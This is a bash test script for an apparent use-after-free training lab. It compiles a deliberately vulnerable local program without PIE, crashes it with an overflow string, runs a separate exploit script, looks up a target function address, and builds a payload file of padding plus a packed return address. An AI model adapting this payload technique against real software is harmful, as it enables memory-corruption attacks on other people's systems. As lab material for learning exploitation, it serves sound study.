#!/bin/bash

echo "=== Use-After-Free Lab Test Script ==="
echo ""

# Check if compiled binary exists
if [ ! -f "compiled/zafiyetli_sunucu" ]; then
    echo "[-] Compiled binary not found. Compiling..."
    
    # Create compiled directory if it doesn't exist
    mkdir -p compiled
    
    # Detect OS and set appropriate flags
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        echo "[+] Detected Linux, using Linux-specific flags"
        g++ -o compiled/zafiyetli_sunucu source_codes/zafiyetli_sunucu.cpp -no-pie -g -static-libgcc -static-libstdc++
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        echo "[+] Detected macOS, using macOS-specific flags"
        g++ -o compiled/zafiyetli_sunucu source_codes/zafiyetli_sunucu.cpp -no-pie -g
    else
        echo "[+] Unknown OS, using generic flags"
        g++ -o compiled/zafiyetli_sunucu source_codes/zafiyetli_sunucu.cpp -g
    fi
    
    if [ $? -ne 0 ]; then
        echo "[-] Compilation failed!"
        exit 1
    fi
    echo "[+] Compilation successful!"
fi

echo "[+] Testing vulnerable program..."
echo ""

# Test 1: Basic functionality
echo "Test 1: Basic functionality"
echo "test" | ./compiled/zafiyetli_sunucu > /dev/null 2>&1
if [ $? -eq 0 ] || [ $? -eq 139 ]; then  # 139 is SIGSEGV, expected
    echo "[+] Basic program execution works"
else
    echo "[-] Basic program execution failed"
fi

echo ""

# Test 2: Use-After-Free vulnerability
echo "Test 2: Use-After-Free vulnerability (should cause segfault)"
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./compiled/zafiyetli_sunucu > /dev/null 2>&1
if [ $? -eq 139 ]; then
    echo "[+] Use-After-Free vulnerability confirmed (segfault as expected)"
else
    echo "[-] Use-After-Free test failed or unexpected behavior"
fi

echo ""

# Test 3: Exploit script
echo "Test 3: Running exploit script..."
if command -v python3 &> /dev/null; then
    echo "Running exploit..."
    python3 source_codes/exploit.py > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] Exploit script runs successfully!"
    else
        echo "[-] Exploit script failed (this may be normal if target address needs updating)"
    fi
else
    echo "[-] Python3 not found"
fi

echo ""

# Test 4: Get target function address
echo "Test 4: Finding target function address..."
if command -v objdump &> /dev/null; then
    TARGET_ADDR=$(objdump -t compiled/zafiyetli_sunucu | grep "basariMesaji" | head -1 | cut -d' ' -f1)
    if [ ! -z "$TARGET_ADDR" ]; then
        echo "[+] Target function address: 0x$TARGET_ADDR"
        echo "[+] Update exploit.py with this address if needed"
    else
        echo "[-] Could not find target function address"
    fi
else
    echo "[-] objdump not found, cannot determine target address"
fi

echo ""

# Test 5: Create payload file
echo "Test 5: Creating payload file..."
if command -v python3 &> /dev/null; then
    python3 -c "
import struct
PADDING_SIZE = 104
TARGET_ADDRESS = 0x401166  # Default address
payload = b'A' * PADDING_SIZE + struct.pack('<Q', TARGET_ADDRESS)
with open('compiled/payload.bin', 'wb') as f:
    f.write(payload)
print('Payload created: compiled/payload.bin')
" 2>/dev/null
    if [ -f "compiled/payload.bin" ]; then
        echo "[+] Payload file created successfully"
    else
        echo "[-] Failed to create payload file"
    fi
else
    echo "[-] Python3 not found, cannot create payload file"
fi

echo ""

# Test 6: Check layout program
echo "Test 6: Checking layout program..."
if [ -f "source_codes/check_layout.cpp" ]; then
    if [ ! -f "compiled/check_layout" ]; then
        echo "[+] Compiling check_layout.cpp..."
        g++ -o compiled/check_layout source_codes/check_layout.cpp -g
        if [ $? -eq 0 ]; then
            echo "[+] check_layout compiled successfully"
            chmod +x compiled/check_layout
        else
            echo "[-] check_layout compilation failed"
        fi
    else
        echo "[+] check_layout already exists"
    fi
    
    if [ -f "compiled/check_layout" ]; then
        echo "[+] Running check_layout to show struct layout..."
        ./compiled/check_layout 2>/dev/null || echo "[-] check_layout execution failed"
    fi
else
    echo "[-] check_layout.cpp not found"
fi

echo ""
echo "=== Lab Test Complete ==="
